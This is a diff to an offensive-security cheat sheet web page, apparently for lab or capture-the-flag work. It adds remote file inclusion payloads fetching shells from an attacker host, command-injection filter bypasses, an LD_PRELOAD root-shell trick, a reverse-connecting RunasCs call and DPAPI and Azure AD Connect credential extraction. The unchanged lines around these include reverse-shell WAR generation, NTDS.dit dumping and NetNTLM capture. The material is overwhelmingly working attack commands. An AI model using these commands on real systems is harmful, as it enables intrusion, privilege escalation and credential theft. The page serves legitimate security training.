@@ -100,7 +100,7 @@ code{font-family:var(--mono);font-size:12.5px;color:#d7e3f4;background:var(--ele
   <a href="arsenal.html">arsenal</a>
   <a href="cheatsheet.html" aria-current="page">cheat sheet</a>
   <span class="sep"></span>
-  <span class="ver">v1.3.3</span>
+  <span class="ver">v1.4.0</span>
   <button type="button" id="printBtn">print</button>
 </nav>
 
@@ -191,6 +191,11 @@ wpscan --url http://$IP -U &lt;user&gt; -P /usr/share/wordlists/rockyou.txt   # 
 # Jenkins /script (Groovy):  println &#x27;id&#x27;.execute().text
 # Redis unauth -&gt; SSH key:  config set dir /var/lib/redis/.ssh ; config set dbfilename authorized_keys ; set x &#x27;&lt;pubkey&gt;&#x27; ; save
 # Ghostcat (AJP 8009, CVE-2020-1938):  python3 ajpShooter.py http://$IP:8080 8009 /WEB-INF/web.xml read
+# RFI - include takes a URL:  ?page=http://$LHOST/shell.txt
+#   Windows + allow_url_include=Off? UNC still works:  ?page=\\$LHOST\share\shell.php
+#   impacket-smbserver share $(pwd) -smb2support     (use real samba if smbserver drops the connection)
+# cmdi filter bypass: cat${IFS}/etc/passwd | {cat,/etc/passwd} | c\at /etc/pa*wd | echo Y2F0|base64 -d|sh
+# PHP type juggling: password[]=x (array -&gt; NULL == 0) | 0e magic hashes compare equal (&#x27;0e12&#x27; == &#x27;0e99&#x27;)
 
 # Tomcat Manager -&gt; WAR shell (defaults: tomcat:tomcat / tomcat:s3cret / admin:admin)
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o rev.war
@@ -246,13 +251,21 @@ nxc ldap $IP -u &lt;user&gt; -p &lt;pass&gt; --gmsa        # gMSA managed passwo
 #   diskshadow (expose C: as Z:) ; robocopy /b Z:\Windows\NTDS . ntds.dit ; reg save hklm\system system
 #   secretsdump.py -ntds ntds.dit -system system LOCAL
 runas /user:&lt;dom&gt;\administrator /savecred &quot;cmd /c whoami&quot;   # re-use a cmdkey-stored cred
+RunasCs.exe &lt;user&gt; &lt;pass&gt; &quot;cmd /c whoami&quot; -r $LHOST:$LPORT  # run as a user with no WinRM/RDP, from a shell
+# DPAPI -&gt; plaintext (saved RDP/network/browser creds), not a hash:
+#   blobs in %APPDATA%\Microsoft\Credentials\ ; masterkey in ..\Protect\&lt;SID&gt;\
+#   mimikatz: dpapi::masterkey /in:&lt;mk&gt; /sid:&lt;SID&gt; /password:&lt;pw&gt;  then  dpapi::cred /in:&lt;blob&gt;
+#   or: impacket-dpapi credential -file &lt;blob&gt; -key &lt;masterkey&gt;
+# Azure AD Connect box? ADSync DB holds a DA password it can decrypt (azuread_decrypt_msol.ps1)
 dir /R                                          # NTFS alternate data streams (Get-Content f -Stream x)
 # forced auth from a writable share - Explorer fetches the icon, leaking NetNTLMv2 to Responder
 printf &#x27;[Shell]\nCommand=2\nIconFile=\\\\%s\\share\\x.ico\n[Taskbar]\nCommand=ToggleDesktop\n&#x27; &quot;$LHOST&quot; &gt; @pwn.scf
 smbclient //$IP/&lt;share&gt; -N -c &#x27;put @pwn.scf&#x27;    # .url (URL=file://$LHOST/x.ico) or .lnk work too
 # LDAP passback - point a printer/appliance&#x27;s LDAP server at you, its bind arrives in cleartext
 sudo nc -lvnp 389</code></pre></div>
-<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>kerbrute userenum -d &lt;domain&gt; --dc $IP users.txt
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>nxc smb $IP -u &#x27;&#x27; -p &#x27;&#x27; --rid-brute 10000     # real user list from a null/guest session
+impacket-lookupsid &lt;domain&gt;/guest@$IP 10000   # same idea, via SID walking
+kerbrute userenum -d &lt;domain&gt; --dc $IP users.txt
 impacket-GetNPUsers &lt;domain&gt;/ -no-pass -usersfile users.txt -dc-ip $IP        # AS-REP roast
 impacket-GetUserSPNs &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt; -dc-ip $IP -request               # Kerberoast
 impacket-secretsdump &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@$IP
@@ -320,6 +333,9 @@ showmount -e $IP                               # look for (rw,no_root_squash); c
 sudo mount -t nfs $IP:/export /mnt -o nolock &amp;&amp; sudo cp /bin/bash /mnt/rootbash &amp;&amp; sudo chmod +s /mnt/rootbash
 #   then on target:  /export/rootbash -p
 id                                             # disk -&gt; debugfs /dev/sda1 (read/write any file) | adm -&gt; /var/log | shadow
+# sudo -l shows env_keep+=LD_PRELOAD -&gt; root with ANY allowed binary, no GTFOBins entry needed
+#   gcc -fPIC -shared -nostartfiles -o /tmp/x.so x.c   (x.c: void _init(){setuid(0);system(&quot;/bin/bash&quot;);})
+#   sudo LD_PRELOAD=/tmp/x.so &lt;any-allowed-binary&gt;
 # python import hijack: root script does &#x27;import config&#x27; and its dir is writable -&gt; drop config.py
 
 # Windows
@@ -364,6 +380,14 @@ kubectl auth can-i --list            # create pods -&gt; schedule a privileged h
 <div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>hashcat -m &lt;mode&gt; hash.txt /usr/share/wordlists/rockyou.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 # common modes: 0 md5, 1000 ntlm, 1800 sha512crypt, 13100 kerberoast TGS
+# creds hide in file formats, not just hashes - read the artefact before cracking anything
+vncpwd ~/.vnc/passwd                          # VNC: published DES key -&gt; plaintext, no cracking
+kpcli --kdb db.kdbx                           # KeePass, once you have the master password
+mdb-tables b.mdb &amp;&amp; mdb-export b.mdb users    # MS Access (mdbtools)
+readpst -o out mail.pst                       # Outlook -&gt; mbox (pst-utils)
+sqlite3 app.db .dump                          # any dropped .db
+# and triage every file a box hands you
+exiftool f.jpg ; binwalk -e f.png ; strings -n 8 f.bin ; steghide extract -sf f.jpg
 ciscot7.py -d -p &lt;type7&gt;                       # Cisco type 7 is reversible; type 5 = md5crypt (john)
 hashcat --example-hashes | grep -i &lt;type&gt;      # find the right mode</code></pre></div>
 <h2 id="searchsploit">searchsploit</h2>
